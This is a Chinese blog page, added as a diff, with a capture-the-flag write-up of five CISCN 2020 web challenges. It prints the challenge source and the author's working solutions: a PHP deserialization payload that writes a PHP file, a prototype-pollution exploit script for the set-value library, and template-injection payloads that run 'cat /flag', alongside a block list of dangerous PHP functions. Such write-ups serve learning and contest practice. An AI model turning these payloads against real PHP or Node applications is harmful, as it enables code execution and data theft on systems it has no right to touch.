@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+<!--动态线条背景-->
+<script>window.onload = function () {
+            hljs.initHighlighting();
+        }</script>
+
+
+  <body>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com" />
+  
+  
+  
+  <title>CISCN 2020 Web Writeup | iluem&#39;Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Web,CTF," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">iluem.xyz</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>链接</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/qhaoduoyu" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>CISCN 2020 Web Writeup</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-08-21
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/Web/">
+            Web
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="passages国赛"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h1 id="CISCN-2020-Web-Writeup"><a href="#CISCN-2020-Web-Writeup" class="headerlink" title="CISCN 2020 Web Writeup"></a>CISCN 2020 Web Writeup</h1><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code class="php">
+#源码
+&lt;?php
+    //题目环境：php:7.4.8-apache
+    $pid = pcntl_fork();
+    //父进程和子进程都会执行下面代码
+    if ($pid == -1) {
+          //错误处理：创建子进程失败时返回-1.
+        die(&#39;could not fork&#39;);
+    }else if ($pid){
+        //父进程会得到子进程号，所以这里是父进程执行的逻辑
+        $r=pcntl_wait($status);//等待子进程中断，防止子进程成为僵尸进程。
+        if(!pcntl_wifexited($status)){//检查状态代码是否代表一个正常的退出。当子进程状态代码代表正常退出时返回 false ，其他情况返回 true。
+            phpinfo();
+        }
+    }else{
+        //子进程得到的$pid为0, 所以这里是子进程执行的逻辑。
+        highlight_file(__FILE__);     if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
+            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);
+        }
+        posix_kill(posix_getpid(), SIGUSR1);
+    }</code></pre>
+<p>此题的点无非就两个，要么先看phpinfo，要么直接命令执行，不过后边多出两个参数实在难以直接命令执行。但是题目给了phpinfo，而且提示给了让进程异常退出，异常退出则父进程进去看phpinfo，</p>
+<p>如何构造函数让它退出呢。因为<code>call_user_func_array</code>后边加了两个参数</p>
+<p>.尝试很多个函数无果后再仔细搜每个函数的作用，最终找到了源码中一个函数</p>
+<p><img src="https://i.loli.net/2020/08/21/fsote1TVqW37AaY.png" alt="image-20200821083521948"></p>
+<p>该函数正常返回值pid，异常返回-1，如果子进程异常退出则父进程查看phpinfo，所以要是能让它异常返回则拿到我们想要的东西了<code>call_user_func</code>加<code>pcntl_wait</code></p>
+<p><img src="https://i.loli.net/2020/08/21/8i43uYMPLgz5nre.png" alt="image-20200821084956522"></p>
+<p>让其返回值为-1，则进入phpinfo页面，搜索flag即找到flag。</p>
+<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>说实话这题太坑了，指的不是它难，是因为刚做过WMCTF一道几乎原题，不过函数给ban了。尝试好几个函数之后，终于能在本地执行了，可线上又不行，发现是php版本原因。7.2以下就不能执行，原因暂时不清楚，后边再看看。最后在队友的帮助下找到了一个WMCTF时候ban掉的函数，可真是太简单了吧。/(ㄒoㄒ)/~~</p>
+<pre><code class="php">#jlg.php
+function write($file,array $data=NULL) {
+        if (!$this-&gt;dir || $this-&gt;lazy)
+            return count($this-&gt;data[$file]=$data);
+        $fw=\Base::instance();
+        switch ($this-&gt;format) {
+            case self::FORMAT_JSON:
+                $out=json_encode($data,JSON_PRETTY_PRINT);
+                break;
+            case self::FORMAT_Serialized:
+                $out=$fw-&gt;serialize($data);
+                break;
+        }
+        return $fw-&gt;write($this-&gt;dir.$file,$out);
+    }
+function __destruct() {
+        if ($this-&gt;lazy) {
+            $this-&gt;lazy = FALSE;
+            foreach ($this-&gt;data?:[] as $file =&gt; $data)
+                $this-&gt;write($file,$data);
+        }
+    }</code></pre>
+<p>最终payload</p>
+<pre><code class="php">&lt;?php
+namespace DB;
+class Jig
+{
+    const     FORMAT_Serialized = 1;
+    const       FORMAT_JSON = 0;
+    protected $lazy = true;
+    protected $dir = true;
+    protected $format = true;
+    protected $data = array(&quot;1.php&quot;=&gt;array(&quot;&lt;?php phpinfo();?&gt;&quot;=&gt;true));
+}
+echo urlencode((serialize(new Jig())));
+//O%3A6%3A%22DB%5CJig%22%3A4%3A%7Bs%3A7%3A%22%00%2A%00lazy%22%3Bb%3A1%3Bs%3A6%3A%22%00%2A%00dir%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00format%22%3Bb%3A1%3Bs%3A7%3A%22%00%2A%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%221.php%22%3Ba%3A1%3A%7Bs%3A18%3A%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3Bb%3A1%3B%7D%7D%7D</code></pre>
+<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>源码如下</p>
+<pre><code class="php">&lt;?php
+class trick{
+    public $trick1;
+    public $trick2;
+    public function __destruct(){
+        $this-&gt;trick1 = (string)$this-&gt;trick1;
+        if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5){
+            die(&quot;你太长了&quot;);
+        }
+        if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2){
+            echo file_get_contents(&quot;/flag&quot;);
+        }
+    }
+}
+highlight_file(__FILE__);
+unserialize($_GET[&#39;trick&#39;]);</code></pre>
+<p>这题一开始没什么思路，比较和普通的md5不一样，弱类型，强碰撞都不行，尝试了<code>&#39;&#39;</code>，NULL和FALSE，但是不满足第三个比较。最后想到1/0和INF，脑子一下冒出来了，居然就可行了，其实后来想也挺合理，INF从数值上看的话在php里是一个固定值，但是代表的含义却不同，这样也符合逻辑。</p>
+<pre><code>var_dump($this-&gt;trick1 !== $this-&gt;trick2);;
+var_dump(md5($this-&gt;trick1) === md5($this-&gt;trick2));
+var_dump($this-&gt;trick1 != $this-&gt;trick2);
+bool(true)
+bool(true)
+bool(true)
+
+&lt;?php
+class trick{
+    public $trick1=1/0;
+    public $trick2=2/0;
+}
+echo serialize(new trick());
+
+//O:5:&quot;trick&quot;:2:{s:6:&quot;trick1&quot;;d:INF;s:6:&quot;trick2&quot;;d:INF;}</code></pre><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><p>这道题其实挺简单的但是因为不熟悉node.js还是看了好久好久。</p>
+<p>题目背景故事类似于<code>balabenba</code></p>
+<p>给了源码，而且比较友好，省去了大部分不必要的代码。</p>
+<pre><code class="js">#主要逻辑在三个路由
+router.post(&quot;/Privilege&quot;, function (req, res, next) {
+    // Why not ask witch for help?
+    if(req.session.knight === undefined){
+        res.redirect(&#39;/SpawnPoint&#39;);
+    }else{
+        if (req.body.NewAttributeKey === undefined || req.body.NewAttributeValue === undefined) {
+            res.send(&quot;What&#39;s your problem?&quot;);
+        }else {
+            let key = req.body.NewAttributeKey.toString();
+            let value = req.body.NewAttributeValue.toString();
+            setFn(req.session.knight, key, value);
+            res.send(&quot;Let&#39;s have a check!&quot;);
+        }
+    }
+});
+router.get(&#39;/SpawnPoint&#39;, function (req, res, next) {
+    req.session.knight = {
+        &quot;HP&quot;: 1000,
+        &quot;Gold&quot;: 10,
+        &quot;Firepower&quot;: 10
+    }
+    res.send(&quot;Let&#39;s begin!&quot;);
+});
+router.post(&quot;/DeveloperControlPanel&quot;, function (req, res, next) {
+    // not implement
+    if (req.body.key === undefined || req.body.password === undefined){
+        res.send(&quot;What&#39;s your problem?&quot;);
+    }else {
+        let key = req.body.key.toString();
+        let password = req.body.password.toString();
+        if(Admin[key] === password){
+            res.send(process.env.flag);
+        }else {
+            res.send(&quot;Wrong password!Are you Admin?&quot;);
+        }
+    }
+
+});</code></pre>
+<p>首先给了提示，从<code>Privilege</code>开始看大概意思是如果没有获取<code>session</code>要先跳转到<code>SpawnPoint</code>获取<code>session</code>值然后才能进行下一步操作，设置<code>NewAttributeKey</code>和<code>NewAttributeValue</code>通过POST传参。然后<code>setFn</code>不知道这是干嘛的，然后去搜了一下<code>setvalue</code>才明白类似于库的东西，不过同时搜到了cve的poc，如下所示。</p>
+<pre><code class="js">const setFn = require(&#39;set-value&#39;);
+const paths = [ &#39;constructor.prototype.a0&#39;, &#39;__proto__.a1&#39;, ]; 
+function check() { 
+    for (const p of paths) 
+        { setFn({}, p, true); } 
+    for (let i = 0; i &lt; paths.length; i++) 
+        { 
+            if (({})[`a${i}`] === true)
+            { console.log(`Yes with ${paths[i]}`); } 
+        } 
+} 
+check();</code></pre>
+<p>放到环境下运行，可行，那么确定有漏洞了，然后去看了老久才明白这个简单的原型污染，然后接下来就简单了</p>
+<pre><code class="js">const setFn = require(&#39;set-value&#39;); 
+const paths = [ &#39;constructor.prototype.abc&#39; ]; 
+var  knight = {
+    &quot;HP&quot;: 1000,
+    &quot;Gold&quot;: 10,
+    &quot;Firepower&quot;: 10
+}
+function check() { 
+    for (const p of paths) 
+    { setFn(knight, p, 10); } 
+    for (var i = 0; i &lt; paths.length; i++) 
+
+    { console.log(({})[`password${i}`]);
+    if (({})[`a${i}`] === true) 
+    { console.log(`Yes with ${paths[i]}`); } } 
+} 
+check();
+const Admin = {
+    &quot;password1&quot;:process.env.p1,
+    &quot;password2&quot;:process.env.p2,
+    &quot;password3&quot;:process.env.p3
+}
+console.log(Admin[&quot;abc&quot;]);</code></pre>
+<p>尝试了一下可行，那就直接上吧，因为在<code>DeveloperControlPanel</code>里</p>
+<pre><code class="js"> if(Admin[key] === password)
+ res.send(process.env.flag);</code></pre>
+<p>如果相等就拿到flag，那么就让他们相等吧</p>
+<pre><code class="python"># -*- coding:utf8 -*-
+import requests
+import json
+headers = {
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+}
+data1 = {
+    &#39;NewAttributeKey&#39;: &#39;__proto__.abc&#39;,
+    &#39;NewAttributeValue&#39;: &#39;123456&#39;
+}
+data2 = {
+    &#39;key&#39;:&#39;abc&#39;,
+    &#39;password&#39; : &#39;123456&#39;
+}
+myd = requests.session()
+url1 = &quot;http://eci-2zeii3a0go4amcdpx8zl.cloudeci1.ichunqiu.com:8888/SpawnPoint&quot;
+url2 = &quot;http://eci-2zeii3a0go4amcdpx8zl.cloudeci1.ichunqiu.com:8888/Privilege&quot;
+url3 = &quot;http://eci-2zeii3a0go4amcdpx8zl.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel&quot;
+myd.post(url2)
+myd.post(url2, headers=headers, data=json.dumps(data1))
+print (myd.post(url3,data=data2).content)</code></pre>
+<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><pre><code class="php">&lt;?php
+error_reporting(0);
+#highlight_file(__FILE__);
+#parserIfLabel($_GET[&#39;a&#39;]);
+function danger_key($s) {
+    $s=htmlspecialchars($s);
+    //将特殊字符替换为html实体
+    $key=array(&#39;php&#39;,&#39;preg&#39;,&#39;server&#39;,&#39;chr&#39;,&#39;decode&#39;,&#39;html&#39;,&#39;md5&#39;,&#39;post&#39;,&#39;get&#39;,&#39;request&#39;,&#39;file&#39;,&#39;cookie&#39;,&#39;session&#39;,&#39;sql&#39;,&#39;mkdir&#39;,&#39;copy&#39;,&#39;fwrite&#39;,&#39;del&#39;,&#39;encrypt&#39;,&#39;$&#39;,&#39;system&#39;,&#39;exec&#39;,&#39;shell&#39;,&#39;open&#39;,&#39;ini_&#39;,&#39;chroot&#39;,&#39;eval&#39;,&#39;passthru&#39;,&#39;include&#39;,&#39;require&#39;,&#39;assert&#39;,&#39;union&#39;,&#39;create&#39;,&#39;func&#39;,&#39;symlink&#39;,&#39;sleep&#39;,&#39;ord&#39;,&#39;str&#39;,&#39;source&#39;,&#39;rev&#39;,&#39;base_convert&#39;);
+    $s = str_ireplace($key,&quot;*&quot;,$s);
+    //替换为*
+    $danger=array(&#39;php&#39;,&#39;preg&#39;,&#39;server&#39;,&#39;chr&#39;,&#39;decode&#39;,&#39;html&#39;,&#39;md5&#39;,&#39;post&#39;,&#39;get&#39;,&#39;request&#39;,&#39;file&#39;,&#39;cookie&#39;,&#39;session&#39;,&#39;sql&#39;,&#39;mkdir&#39;,&#39;copy&#39;,&#39;fwrite&#39;,&#39;del&#39;,&#39;encrypt&#39;,&#39;$&#39;,&#39;system&#39;,&#39;exec&#39;,&#39;shell&#39;,&#39;open&#39;,&#39;ini_&#39;,&#39;chroot&#39;,&#39;eval&#39;,&#39;passthru&#39;,&#39;include&#39;,&#39;require&#39;,&#39;assert&#39;,&#39;union&#39;,&#39;create&#39;,&#39;func&#39;,&#39;symlink&#39;,&#39;sleep&#39;,&#39;ord&#39;,&#39;str&#39;,&#39;source&#39;,&#39;rev&#39;,&#39;base_convert&#39;);
+    foreach ($danger as $val){
+        if(strpos($s,$val) !==false){
+            die(&#39;很抱歉，执行出错，发现危险字符【&#39;.$val.&#39;】&#39;);
+        }
+    }
+   // if(preg_match(&quot;/^[a-z]$/i&quot;)){
+   //     die(&#39;很抱歉，执行出错，发现危险字符&#39;);
+   // }
+    return $s;
+}
+
+function parserIfLabel( $content ) {
+    $pattern = &#39;/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/&#39;;
+    if ( preg_match_all( $pattern, $content, $matches ) ) {
+        //将匹配到的字符串保存在多维数组matchers中
+        var_dump($matches[0]);
+        var_dump($matches[1]);
+        var_dump($matches);
+        $count = count( $matches[ 0 ] );
+        for ( $i = 0; $i &lt; $count; $i++ ) {
+            $flag = &#39;&#39;;
+            $out_html = &#39;&#39;;
+            $ifstr = $matches[ 1 ][ $i ];
+            //对每一对匹配到的进行检测
+            $ifstr=danger_key($ifstr,1);
+            if(strpos($ifstr,&#39;=&#39;) !== false){//如果里边有等号
+                $arr= splits($ifstr,&#39;=&#39;);//以等号作为分隔符分割ifstr，数组赋值给arr
+                if($arr[0]==&#39;&#39; || $arr[1]==&#39;&#39;){
+                    die(&#39;很抱歉，模板中有错误的判断,请修正【&#39;.$ifstr.&#39;】&#39;);
+                }
+                $ifstr = str_replace( &#39;=&#39;, &#39;==&#39;, $ifstr );//将ifstr里的=号替换为==
+            }
+            $ifstr = str_replace( &#39;&lt;&gt;&#39;, &#39;!=&#39;, $ifstr );
+            $ifstr = str_replace( &#39;or&#39;, &#39;||&#39;, $ifstr );
+            $ifstr = str_replace( &#39;and&#39;, &#39;&amp;&amp;&#39;, $ifstr );
+            $ifstr = str_replace( &#39;mod&#39;, &#39;%&#39;, $ifstr );
+            $ifstr = str_replace( &#39;not&#39;, &#39;!&#39;, $ifstr );
+            //一系列替换
+            if ( preg_match( &#39;/\{|}/&#39;, $ifstr)) {
+                //匹配{}？
+                die(&#39;很抱歉，模板中有错误的判断,请修正&#39;.$ifstr);
+            }else{
+                /*ifstr=true)fpassthru(fopen($filename, &quot;r&quot;));elseif(false*/
+                @eval( &#39;if(&#39; . $ifstr . &#39;){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}&#39; );
+            }
+
+            if ( preg_match( &#39;/([\s\S]*)?\{else\}([\s\S]*)?/&#39;, $matches[ 2 ][ $i ], $matches2 ) ) {
+                switch ( $flag ) {
+                    case &#39;if&#39;:
+                        if ( isset( $matches2[ 1 ] ) ) {
+                            $out_html .= $matches2[ 1 ];
+                        }
+                        break;
+                    case &#39;else&#39;:
+                        if ( isset( $matches2[ 2 ] ) ) {
+                            $out_html .= $matches2[ 2 ];
+                        }
+                        break;
+                }
+            } elseif ( $flag == &#39;if&#39; ) {
+                $out_html .= $matches[ 2 ][ $i ];
+            }
+            $pattern2 = &#39;/\{if([0-9]):/&#39;;
+            if ( preg_match( $pattern2, $out_html, $matches3 ) ) {
+                $out_html = str_replace( &#39;{if&#39; . $matches3[ 1 ], &#39;{if&#39;, $out_html );
+                $out_html = str_replace( &#39;{else&#39; . $matches3[ 1 ] . &#39;}&#39;, &#39;{else}&#39;, $out_html );
+                $out_html = str_replace( &#39;{end if&#39; . $matches3[ 1 ] . &#39;}&#39;, &#39;{end if}&#39;, $out_html );
+                $out_html = $this-&gt;parserIfLabel( $out_html );
+            }
+            $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content );
+        }
+    }
+    return $content;
+}
+
+function splits( $s, $str=&#39;,&#39; ) {
+    if ( empty( $s ) ) return array( &#39;&#39; );
+    if ( strpos( $s, $str ) !== false ) {
+        return explode( $str, $s );//用str作为分隔符分割s为数组
+    } else {
+        return array( $s );
+    }
+}</code></pre>
+<p>看着挺复杂的，但是仔细去读感觉又是那么一回事，不过这个正则匹配有点东西，因为自己不熟悉，所以还是看了好久的。结果刚刚明白这个正则之后才发现有原题我去。呕血/ff。</p>
+<p>参考payload</p>
+<pre><code> {if:var_dump(((strrev(stnetnoc_teg_elif)))((strrev(edoced_46esab))(Li8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn)))}{end i}</code></pre><p>由于本题多过滤了一个rev，因此换一种方法吧。</p>
+<pre><code> {if:var_dump((&#39;ex&#39;.&#39;ec&#39;)(&#39;cat /flag&#39;))}{end if}</code></pre>
+    </div>
+  </div>
+  
+  
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/CTF/">
+              #CTF
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/passagesBUUCTF/" target="_self">BUUCTF WriteUp</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/passages2020%E5%BC%BA%E7%BD%91%E6%9D%AF/" target="_self">强网杯 2020 Writeup</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz",
+      appKey: "sivgWCRfGcA6BX905S8dIz1E",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz", "sivgWCRfGcA6BX905S8dIz1E");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw" target="_blank" rel="noopener">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/" target="_blank" rel="noopener">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2020, 5, 8).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
